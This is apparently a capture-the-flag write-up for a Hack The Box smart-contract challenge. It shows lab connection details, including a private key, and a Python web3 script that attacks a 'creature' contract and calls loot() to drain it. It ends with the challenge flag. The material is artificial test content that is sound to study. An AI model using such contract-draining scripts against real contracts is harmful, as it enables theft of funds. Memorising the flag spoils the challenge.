
![](https://cdn-images-1.medium.com/max/1000/1*ynFEBFYN2UZSWXOUc0WJ4Q.png)

#### Challenge Scenario

---

Alex had always dreamed of becoming a warrior, but she wasn’t particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.

check the website

![](https://cdn-images-1.medium.com/max/1000/1*BuJiNHfeyB8rzvr9Yhk5oA.png)

hum…

 it looks like a challenge we did before

[https://syc-sigma.vercel.app/p/HTB%20Distract%20and%20Destroy%20Wtiteup](https://syc-sigma.vercel.app/p/HTB%20Distract%20and%20Destroy%20Wtiteup)

so, check the docs and connection

![](https://cdn-images-1.medium.com/max/1000/1*-EI--Jz1lM6y9vUEPPPdGg.png)

![](https://cdn-images-1.medium.com/max/1000/1*X3xLkX-8uQjviJ69mlTwtw.png)

{  
 “PrivateKey”: “0xeb5b17d93eed6ab13eb09661b501f6271ffe9845105b3443ca0d2020f7e1a722”,  
 “Address”: “0x3cB46C3A0885a600AA070c93A45A27cbC6bD1cC3”,  
 “TargetAddress”: “0xF640781e38F42Fa98399eA7112f701d5b3c0FC57”,  
 “setupAddress”: “0x495Fa4a24CABaD8dd4E448a7A4311bf34d9030aA”  
}

and the zip file

![](https://cdn-images-1.medium.com/max/1000/1*shec10EC9M01Ece0tOT-tA.png)

so, use the payload below

> **#!/usr/bin/env python3**

> **from web3 import Web3**

> **# =========================  
> # CONFIG  
> # =========================**

> **RPC_URL = “http://your target/rpc"**

> **PRIVATE_KEY = “what you get from connection”**

> **PLAYER_ADDRESS = “what you get from connection”**

> **TARGET_ADDRESS = “what you get from connection”**

> **SETUP_ADDRESS = “what you get from connection”**

> **# =========================  
> # WEB3 INIT  
> # =========================**

> **w3 = Web3(Web3.HTTPProvider(RPC_URL))**

> **assert w3.is_connected(), “RPC connection failed”**

> **account = w3.eth.account.from_key(PRIVATE_KEY)**

> **print(f”[+] Connected to RPC”)  
> print(f”[+] Using account: {account.address}”)**

> **# =========================  
> # CONTRACT ABIS  
> # =========================**

> **CREATURE_ABI = [  
>  {  
>  “inputs”: [  
>  {  
>  “internalType”: “uint256”,  
>  “name”: “_damage”,  
>  “type”: “uint256”  
>  }  
>  ],  
>  “name”: “strongAttack”,  
>  “outputs”: [],  
>  “stateMutability”: “nonpayable”,  
>  “type”: “function”  
>  },  
>  {  
>  “inputs”: [],  
>  “name”: “loot”,  
>  “outputs”: [],  
>  “stateMutability”: “nonpayable”,  
>  “type”: “function”  
>  },  
>  {  
>  “inputs”: [],  
>  “name”: “lifePoints”,  
>  “outputs”: [  
>  {  
>  “internalType”: “uint256”,  
>  “name”: “”,  
>  “type”: “uint256”  
>  }  
>  ],  
>  “stateMutability”: “view”,  
>  “type”: “function”  
>  }  
> ]**

> **SETUP_ABI = [  
>  {  
>  “inputs”: [],  
>  “name”: “isSolved”,  
>  “outputs”: [  
>  {  
>  “internalType”: “bool”,  
>  “name”: “”,  
>  “type”: “bool”  
>  }  
>  ],  
>  “stateMutability”: “view”,  
>  “type”: “function”  
>  }  
> ]**

> **# =========================  
> # CONTRACT OBJECTS  
> # =========================**

> **creature = w3.eth.contract(  
>  address=Web3.to_checksum_address(TARGET_ADDRESS),  
>  abi=CREATURE_ABI  
> )**

> **setup = w3.eth.contract(  
>  address=Web3.to_checksum_address(SETUP_ADDRESS),  
>  abi=SETUP_ABI  
> )**

> **# =========================  
> # HELPER  
> # =========================**

> **def send_tx(tx):  
>  tx.update({  
>  “from”: account.address,  
>  “nonce”: w3.eth.get_transaction_count(account.address),  
>  “gas”: 300000,  
>  “chainId”: w3.eth.chain_id,  
>  })**

> **signed = account.sign_transaction(tx)**

> **tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)**

> **print(f”[+] TX Sent: {w3.to_hex(tx_hash)}”)**

> **receipt = w3.eth.wait_for_transaction_receipt(tx_hash)**

> **print(f”[+] TX Confirmed in block {receipt.blockNumber}”)**

> **return receipt**

> **# =========================  
> # CHECK INITIAL STATE  
> # =========================**

> **life = creature.functions.lifePoints().call()**

> **print(f”[+] Current lifePoints: {life}”)**

> **# =========================  
> # ATTACK  
> # =========================**

> **print(“[*] Attacking creature…”)**

> **attack_tx = creature.functions.strongAttack(20).build_transaction({})**

> **send_tx(attack_tx)**

> **life = creature.functions.lifePoints().call()**

> **print(f”[+] lifePoints after attack: {life}”)**

> **# =========================  
> # LOOT  
> # =========================**

> **print(“[*] Looting contract…”)**

> **loot_tx = creature.functions.loot().build_transaction({})**

> **send_tx(loot_tx)**

> **# =========================  
> # CHECK SOLVED  
> # =========================**

> **solved = setup.functions.isSolved().call()**

> **print(f”[+] Challenge solved: {solved}”)**

> **if solved:  
>  print(“[+] SUCCESS!”)  
> else:  
>  print(“[-] Challenge not solved”)**

![](https://cdn-images-1.medium.com/max/1000/1*n3AmTArBbZ-76_SVrvv4Jw.png)

run, and got the flag

![](https://cdn-images-1.medium.com/max/1000/1*uGyUZ0C-bUxqnPwH04kxLg.png)

**_HTB{g0t_y0u2_f1r5t_b100d}_**